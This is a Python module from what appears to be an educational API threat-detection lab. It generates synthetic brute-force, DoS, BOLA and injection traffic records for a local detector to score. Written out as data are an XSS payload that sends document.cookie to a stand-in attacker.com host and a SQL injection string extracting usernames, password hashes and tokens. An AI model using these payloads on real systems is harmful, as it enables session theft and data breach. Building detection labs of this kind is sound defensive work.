"""
AI SENTINEL - Attack Simulation Lab & Data Seeder
Provides local educational simulation of API traffic, brute force,
volumetric DoS spikes, BOLA/unauthorized access, and injection payloads.
"""

import random
import uuid
from datetime import datetime, timedelta, timezone
from models import db, APIRequest, SecurityAlert, SimulationEvent, SecurityLog, User
from detection import detector, calculate_payload_risk, calculate_endpoint_weight

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Python-requests/2.31.0',
    'PostmanRuntime/7.36.0',
    'curl/8.4.0',
    'Go-http-client/1.1'
]

NORMAL_ENDPOINTS = [
    ('GET', '/api/v1/products', 200, 35.0, 180),
    ('GET', '/api/v1/products/featured', 200, 42.0, 320),
    ('GET', '/api/v1/user/profile', 200, 28.0, 210),
    ('POST', '/api/v1/cart/items', 201, 55.0, 410),
    ('GET', '/api/v1/notifications', 200, 22.0, 95),
    ('GET', '/api/v1/health', 200, 12.0, 45),
    ('POST', '/api/v1/search', 200, 68.0, 520)
]

SAFE_IPS = [
    '192.168.1.105', '10.0.4.22', '172.16.2.14', '192.168.2.45',
    '10.20.1.88', '172.24.12.9', '192.168.10.15'
]

ATTACK_IPS = {
    'brute_force': '198.51.100.44',
    'dos_spike': '203.0.113.88',
    'unauthorized': '185.220.101.5',
    'payload_sqli': '45.33.32.156',
    'payload_xss': '194.26.29.112',
    'custom': '198.51.100.99'
}


def run_simulation(sim_type: str, custom_params: dict = None) -> dict:
    """
    Executes an educational simulation based on the requested attack scenario.
    Saves API requests, processes via ML engine, registers alerts & audit logs.
    """
    sim_type = (sim_type or 'normal').lower()
    now = datetime.now(timezone.utc)
    sim_id = f"SIM-{uuid.uuid4().hex[:8].upper()}"
    
    generated_requests = []
    generated_alerts = []
    
    if sim_type == 'normal':
        # Simulate 1 to 3 normal valid business requests
        count = int(custom_params.get('count', 3)) if custom_params else 3
        title = "Normal API Traffic Simulation"
        desc = f"Simulated {count} standard legitimate client requests conforming to expected baseline."
        
        for i in range(count):
            method, ep, status, latency, size = random.choice(NORMAL_ENDPOINTS)
            ip = random.choice(SAFE_IPS)
            
            req_data = {
                'request_frequency': random.uniform(2.0, 8.0),
                'failed_login_count': 0,
                'response_status': status,
                'payload_size': size + random.randint(-20, 40),
                'response_time_ms': latency + random.uniform(-5.0, 15.0),
                'auth_status': 0,
                'payload_risk_indicator': 0.0,
                'endpoint_risk_weight': calculate_endpoint_weight(ep)
            }
            
            eval_result = detector.predict_request(req_data)
            
            req_obj = APIRequest(
                request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
                timestamp=now - timedelta(seconds=(count - i) * 2),
                method=method,
                endpoint=ep,
                ip_address=ip,
                user_agent=random.choice(USER_AGENTS[:3]),
                status_code=status,
                response_time_ms=req_data['response_time_ms'],
                payload_size=int(req_data['payload_size']),
                classification=eval_result['classification'],
                anomaly_score=eval_result['anomaly_score'],
                risk_score=eval_result['risk_score'],
                threat_type='None',
                is_blocked=False,
                reasons='; '.join(eval_result['reasons'])
            )
            db.session.add(req_obj)
            generated_requests.append(req_obj)

        log = SecurityLog(
            event_type='SIMULATION',
            source_ip='127.0.0.1',
            endpoint='/api/v1/simulate',
            risk_score=12,
            detection_result='Normal Baseline Traffic',
            action_taken='Allowed',
            details=f"Executed simulation {sim_id}: Generated {count} normal baseline API requests."
        )
        db.session.add(log)

    elif sim_type == 'brute_force':
        # Simulate Credential Stuffing / Brute Force on /api/v1/auth/login
        attempts = int(custom_params.get('count', 8)) if custom_params else 8
        title = "Credential Stuffing / Brute Force Attack"
        ip = ATTACK_IPS['brute_force']
        endpoint = '/api/v1/auth/login'
        desc = f"Simulated {attempts} rapid failed login attempts from source IP {ip} targeting administrative and customer auth endpoints."
        
        passwords = ['admin123', 'root', 'P@ssw0rd', '12345678', 'welcome2024', 'sentinel!', 'letmein', 'master']
        last_req = None

        for attempt in range(1, attempts + 1):
            pwd = passwords[(attempt - 1) % len(passwords)]
            req_data = {
                'request_frequency': 40.0 + (attempt * 8.0),
                'failed_login_count': attempt,
                'response_status': 401,
                'payload_size': 240 + len(pwd),
                'response_time_ms': 75.0 + random.uniform(5.0, 25.0),
                'auth_status': 2,
                'payload_risk_indicator': 1.5,
                'endpoint_risk_weight': 3
            }
            eval_result = detector.predict_request(req_data)
            
            req_obj = APIRequest(
                request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
                timestamp=now - timedelta(seconds=(attempts - attempt) * 3),
                method='POST',
                endpoint=endpoint,
                ip_address=ip,
                user_agent='Python-requests/2.31.0',
                status_code=401,
                response_time_ms=req_data['response_time_ms'],
                payload_size=int(req_data['payload_size']),
                classification=eval_result['classification'],
                anomaly_score=eval_result['anomaly_score'],
                risk_score=eval_result['risk_score'],
                threat_type='Brute Force / Credential Stuffing',
                is_blocked=eval_result['is_blocked'],
                reasons='; '.join(eval_result['reasons'])
            )
            db.session.add(req_obj)
            generated_requests.append(req_obj)
            last_req = req_obj

        # Generate High/Critical Alert
        alert = SecurityAlert(
            alert_id=f"ALT-{uuid.uuid4().hex[:6].upper()}",
            request_id=last_req.id if last_req else None,
            alert_title="Credential Stuffing / Brute Force Detected",
            category="Authentication",
            severity="Critical" if attempts >= 6 else "High",
            source_ip=ip,
            endpoint=endpoint,
            risk_score=last_req.risk_score if last_req else 88,
            timestamp=now,
            description=f"Rapid authentication failures ({attempts} sequential rejected attempts) detected from source IP {ip}. Pattern matches dictionary brute-force attack signature.",
            recommended_action="Temporarily ban IP in WAF/Firewall, enforce exponential login backoff and require CAPTCHA challenge on /api/v1/auth/login.",
            status="Active"
        )
        db.session.add(alert)
        generated_alerts.append(alert)

        log = SecurityLog(
            event_type='DETECTION',
            source_ip=ip,
            endpoint=endpoint,
            risk_score=alert.risk_score,
            detection_result='Brute Force Attack Confirmed',
            action_taken='Blocked & Alert Raised',
            details=f"Alert {alert.alert_id} generated for {ip} after {attempts} failed login attempts."
        )
        db.session.add(log)

    elif sim_type == 'dos_spike':
        # Simulate Traffic Spike / DoS Flood
        spike_count = int(custom_params.get('count', 20)) if custom_params else 20
        title = "Volumetric Traffic Spike / Rate Limit DoS"
        ip = ATTACK_IPS['dos_spike']
        endpoint = '/api/v1/analytics/reports'
        desc = f"Simulated high-frequency volumetric spike of {spike_count} concurrent requests flooding heavy analytics endpoint."
        
        last_req = None
        for i in range(spike_count):
            status = 429 if i >= 6 else 200
            latency = 120.0 + (i * 45.0)  # Latency spikes under simulated load
            req_data = {
                'request_frequency': 140.0 + (i * 6.0),
                'failed_login_count': 0,
                'response_status': status,
                'payload_size': 450,
                'response_time_ms': min(latency, 2400.0),
                'auth_status': 1,
                'payload_risk_indicator': 0.5,
                'endpoint_risk_weight': 2
            }
            eval_result = detector.predict_request(req_data)
            
            req_obj = APIRequest(
                request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
                timestamp=now - timedelta(seconds=(spike_count - i)),
                method='GET',
                endpoint=endpoint,
                ip_address=ip,
                user_agent='Go-http-client/1.1',
                status_code=status,
                response_time_ms=req_data['response_time_ms'],
                payload_size=int(req_data['payload_size']),
                classification=eval_result['classification'],
                anomaly_score=eval_result['anomaly_score'],
                risk_score=eval_result['risk_score'],
                threat_type='Rate Limit Exceeded / DoS Anomaly',
                is_blocked=eval_result['is_blocked'] or (status == 429),
                reasons='; '.join(eval_result['reasons'])
            )
            db.session.add(req_obj)
            generated_requests.append(req_obj)
            last_req = req_obj

        # Alert for Volumetric Anomaly
        alert = SecurityAlert(
            alert_id=f"ALT-{uuid.uuid4().hex[:6].upper()}",
            request_id=last_req.id if last_req else None,
            alert_title="Volumetric Rate Limit Anomaly / DoS Spike Detected",
            category="Volumetric",
            severity="Critical",
            source_ip=ip,
            endpoint=endpoint,
            risk_score=last_req.risk_score if last_req else 89,
            timestamp=now,
            description=f"Source IP {ip} exceeded standard API rate envelope by 480% with {spike_count} requests dispatched within seconds. Response latency degraded to {int(last_req.response_time_ms)}ms.",
            recommended_action="Activate gateway volumetric rate limiting, return HTTP 429 with Retry-After header, and enable Cloudflare/AWS Shield protection.",
            status="Active"
        )
        db.session.add(alert)
        generated_alerts.append(alert)

        log = SecurityLog(
            event_type='BLOCK',
            source_ip=ip,
            endpoint=endpoint,
            risk_score=alert.risk_score,
            detection_result='Volumetric Rate Limit Exceeded',
            action_taken='Throttled & Blocked',
            details=f"Alert {alert.alert_id}: Rate limit mitigation applied to {ip}."
        )
        db.session.add(log)

    elif sim_type == 'unauthorized':
        # Simulate BOLA / Broken Object Level Auth & Admin Probing
        count = int(custom_params.get('count', 4)) if custom_params else 4
        title = "BOLA / Broken Object Level Authorization Attempt"
        ip = ATTACK_IPS['unauthorized']
        desc = f"Simulated {count} unauthorized privilege escalation attempts probing restricted administrative and tenant endpoints."
        
        sensitive_targets = [
            ('GET', '/api/v1/admin/users/export', 403, 140),
            ('DELETE', '/api/v1/tenants/999/keys', 401, 110),
            ('GET', '/api/v1/internal/config/env', 403, 95),
            ('POST', '/api/v1/admin/roles/grant', 403, 160)
        ]
        
        last_req = None
        for i in range(min(count, len(sensitive_targets))):
            method, ep, status, latency = sensitive_targets[i]
            req_data = {
                'request_frequency': 28.0,
                'failed_login_count': 1,
                'response_status': status,
                'payload_size': 380,
                'response_time_ms': latency,
                'auth_status': 2,  # Invalid/forged token
                'payload_risk_indicator': 3.2,
                'endpoint_risk_weight': 3
            }
            eval_result = detector.predict_request(req_data)
            
            req_obj = APIRequest(
                request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
                timestamp=now - timedelta(seconds=(count - i) * 4),
                method=method,
                endpoint=ep,
                ip_address=ip,
                user_agent='curl/8.4.0',
                status_code=status,
                response_time_ms=req_data['response_time_ms'],
                payload_size=int(req_data['payload_size']),
                classification=eval_result['classification'],
                anomaly_score=eval_result['anomaly_score'],
                risk_score=eval_result['risk_score'],
                threat_type='BOLA / Privilege Escalation Probe',
                is_blocked=eval_result['is_blocked'],
                reasons='; '.join(eval_result['reasons'])
            )
            db.session.add(req_obj)
            generated_requests.append(req_obj)
            last_req = req_obj

        alert = SecurityAlert(
            alert_id=f"ALT-{uuid.uuid4().hex[:6].upper()}",
            request_id=last_req.id if last_req else None,
            alert_title="BOLA / Broken Object Level Auth Attempt",
            category="Access Control",
            severity="High",
            source_ip=ip,
            endpoint=last_req.endpoint if last_req else '/api/v1/admin',
            risk_score=last_req.risk_score if last_req else 78,
            timestamp=now,
            description=f"Client IP {ip} submitted forged or untrusted authorization bearer token trying to access administrative endpoints.",
            recommended_action="Revoke active token signing keys, invalidate suspect session ID, and audit role-based access control (RBAC) middleware.",
            status="Active"
        )
        db.session.add(alert)
        generated_alerts.append(alert)

        log = SecurityLog(
            event_type='DETECTION',
            source_ip=ip,
            endpoint=alert.endpoint,
            risk_score=alert.risk_score,
            detection_result='BOLA Probe Detected',
            action_taken='Flagged & Access Denied',
            details=f"Alert {alert.alert_id} recorded for unauthorized access probe from {ip}."
        )
        db.session.add(log)

    elif sim_type == 'payload':
        # Simulate Malicious Payload Injection (SQLi / XSS)
        subtype = (custom_params.get('subtype', 'sqli') if custom_params else 'sqli').lower()
        title = "Malicious Payload Injection Simulation"
        
        if subtype == 'xss':
            ip = ATTACK_IPS['payload_xss']
            endpoint = '/api/v1/comments'
            method = 'POST'
            payload_str = "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
            threat_name = "Cross-Site Scripting (XSS) Injection"
            category = "Injection"
        else:
            ip = ATTACK_IPS['payload_sqli']
            endpoint = '/api/v1/users/search'
            method = 'POST'
            payload_str = "'; UNION SELECT username, password_hash, token FROM users WHERE '1'='1"
            threat_name = "SQL Injection (SQLi) Attempt"
            category = "Injection"

        p_risk = calculate_payload_risk(payload_str)
        desc = f"Simulated dangerous {threat_name} payload delivery targeting {endpoint}."

        req_data = {
            'request_frequency': 15.0,
            'failed_login_count': 0,
            'response_status': 400,
            'payload_size': len(payload_str) + 120,
            'response_time_ms': 185.0,
            'auth_status': 1,
            'payload_risk_indicator': p_risk,
            'endpoint_risk_weight': 2
        }
        eval_result = detector.predict_request(req_data)
        
        req_obj = APIRequest(
            request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
            timestamp=now,
            method=method,
            endpoint=endpoint,
            ip_address=ip,
            user_agent='PostmanRuntime/7.36.0',
            status_code=400,
            response_time_ms=req_data['response_time_ms'],
            payload_size=int(req_data['payload_size']),
            classification=eval_result['classification'],
            anomaly_score=eval_result['anomaly_score'],
            risk_score=eval_result['risk_score'],
            threat_type=threat_name,
            is_blocked=True,
            reasons='; '.join(eval_result['reasons'])
        )
        db.session.add(req_obj)
        generated_requests.append(req_obj)

        alert = SecurityAlert(
            alert_id=f"ALT-{uuid.uuid4().hex[:6].upper()}",
            request_id=req_obj.id,
            alert_title=f"{threat_name} Detected in Request Body",
            category=category,
            severity="Critical",
            source_ip=ip,
            endpoint=endpoint,
            risk_score=eval_result['risk_score'],
            timestamp=now,
            description=f"Payload heuristic analyzer flagged suspicious regex signature in request data: [{payload_str[:60]}...]. Potential code execution or unauthorized database exfiltration attempt.",
            recommended_action="Block client IP immediately at WAF, inspect ORM query sanitization layers, and verify input escaping on affected endpoint.",
            status="Active"
        )
        db.session.add(alert)
        generated_alerts.append(alert)

        log = SecurityLog(
            event_type='BLOCK',
            source_ip=ip,
            endpoint=endpoint,
            risk_score=alert.risk_score,
            detection_result=f"{threat_name} Blocked",
            action_taken='Payload Blocked & IP Flagged',
            details=f"Alert {alert.alert_id} raised. Request blocked due to malicious signature."
        )
        db.session.add(log)

    else:
        # Fallback normal
        return run_simulation('normal')

    # Commit records to SQLite
    db.session.commit()

    # Calculate average risk score
    scores = [r.risk_score for r in generated_requests]
    avg_score = sum(scores) / len(scores) if scores else 0.0

    # Save Simulation Event Record
    sim_event = SimulationEvent(
        sim_id=sim_id,
        simulation_type=sim_type,
        title=title,
        timestamp=now,
        requests_generated=len(generated_requests),
        threats_detected=len(generated_alerts),
        avg_risk_score=avg_score,
        description=desc
    )
    db.session.add(sim_event)
    db.session.commit()

    return {
        'status': 'success',
        'sim_id': sim_id,
        'simulation_type': sim_type,
        'title': title,
        'requests_count': len(generated_requests),
        'threats_detected': len(generated_alerts),
        'avg_risk_score': round(avg_score, 1),
        'alerts': [a.to_dict() for a in generated_alerts],
        'requests': [r.to_dict() for r in generated_requests],
        'message': f"Simulation completed: {len(generated_requests)} requests processed, {len(generated_alerts)} security alerts generated."
    }


def seed_database(app):
    """
    Seeds database with initial users and realistic baseline API traffic
    if database is freshly initialized.
    """
    with app.app_context():
        db.create_all()

        # Seed Users if none exist
        if User.query.count() == 0:
            from config import Config
            for username, info in Config.DEMO_USERS.items():
                user = User(
                    username=username,
                    role=info['role'],
                    name=info['name']
                )
                user.set_password(info['password'])
                db.session.add(user)
            db.session.commit()

        # Seed initial traffic if empty
        if APIRequest.query.count() == 0:
            now = datetime.now(timezone.utc)
            
            # Generate 40 baseline realistic requests spanning past 2 hours
            for idx in range(40):
                time_offset = timedelta(minutes=(40 - idx) * 3 + random.randint(0, 2))
                req_time = now - time_offset

                # 75% normal, 15% suspicious, 10% past attack attempt
                r_type = random.random()
                if r_type < 0.75:
                    method, ep, status, lat, size = random.choice(NORMAL_ENDPOINTS)
                    ip = random.choice(SAFE_IPS)
                    freq = random.uniform(3.0, 10.0)
                    failed = 0
                    auth_st = 0
                    p_risk = 0.0
                    threat = 'None'
                elif r_type < 0.90:
                    method = 'GET'
                    ep = '/api/v1/users/profile'
                    status = random.choice([401, 403, 404])
                    lat = random.uniform(90.0, 220.0)
                    size = 180
                    ip = '198.51.100.12'
                    freq = random.uniform(25.0, 45.0)
                    failed = 1
                    auth_st = 1
                    p_risk = 1.8
                    threat = 'Anomalous Token / Failed Verification'
                else:
                    method = 'POST'
                    ep = '/api/v1/auth/login'
                    status = 401
                    lat = random.uniform(60.0, 140.0)
                    size = 310
                    ip = '198.51.100.44'
                    freq = random.uniform(60.0, 95.0)
                    failed = random.randint(4, 7)
                    auth_st = 2
                    p_risk = 2.5
                    threat = 'Brute Force / Credential Stuffing'

                req_data = {
                    'request_frequency': freq,
                    'failed_login_count': failed,
                    'response_status': status,
                    'payload_size': size,
                    'response_time_ms': lat,
                    'auth_status': auth_st,
                    'payload_risk_indicator': p_risk,
                    'endpoint_risk_weight': calculate_endpoint_weight(ep)
                }
                
                eval_res = detector.predict_request(req_data)

                req = APIRequest(
                    request_id=f"REQ-{uuid.uuid4().hex[:8].upper()}",
                    timestamp=req_time,
                    method=method,
                    endpoint=ep,
                    ip_address=ip,
                    user_agent=random.choice(USER_AGENTS),
                    status_code=status,
                    response_time_ms=lat,
                    payload_size=size,
                    classification=eval_res['classification'],
                    anomaly_score=eval_res['anomaly_score'],
                    risk_score=eval_res['risk_score'],
                    threat_type=threat,
                    is_blocked=eval_res['is_blocked'],
                    reasons='; '.join(eval_res['reasons'])
                )
                db.session.add(req)

                # Add sample alert for high-risk request
                if eval_res['risk_score'] >= 75 and threat != 'None':
                    alt = SecurityAlert(
                        alert_id=f"ALT-{uuid.uuid4().hex[:6].upper()}",
                        request_id=None,
                        alert_title=f"{threat} Incident Detected",
                        category="Authentication" if "Brute Force" in threat else "Access Control",
                        severity="Critical" if eval_res['risk_score'] >= 80 else "High",
                        source_ip=ip,
                        endpoint=ep,
                        risk_score=eval_res['risk_score'],
                        timestamp=req_time,
                        description=f"Behavioral threat detection triggered on {ep} from IP {ip}. Multiple indicator anomalies identified.",
                        recommended_action="Inspect source IP routing, enforce API gateway rate limits, and audit access credentials.",
                        status=random.choice(["Active", "Investigating", "Mitigated"])
                    )
                    db.session.add(alt)

                # Add sample audit log
                if idx % 4 == 0:
                    log = SecurityLog(
                        timestamp=req_time,
                        event_type='TRAFFIC' if eval_res['risk_score'] < 60 else 'DETECTION',
                        source_ip=ip,
                        endpoint=ep,
                        risk_score=eval_res['risk_score'],
                        detection_result=eval_res['classification'],
                        action_taken=eval_res['action'],
                        details=f"Processed request on {ep} with risk score {eval_res['risk_score']}."
                    )
                    db.session.add(log)

            # Add an initial simulation record
            sim_init = SimulationEvent(
                sim_id=f"SIM-{uuid.uuid4().hex[:8].upper()}",
                simulation_type="baseline",
                title="System Initial Traffic Baseline Seeding",
                timestamp=now - timedelta(hours=2),
                requests_generated=40,
                threats_detected=3,
                avg_risk_score=24.5,
                description="Initial baseline traffic profile automatically generated during system boot."
            )
            db.session.add(sim_init)

            # System startup log
            startup_log = SecurityLog(
                timestamp=now,
                event_type='SYSTEM',
                source_ip='127.0.0.1',
                endpoint='/system/init',
                risk_score=0,
                detection_result='System Operational',
                action_taken='Boot Initialized',
                details='API SENTINEL threat detection engine and database initialized successfully.'
            )
            db.session.add(startup_log)

            db.session.commit()

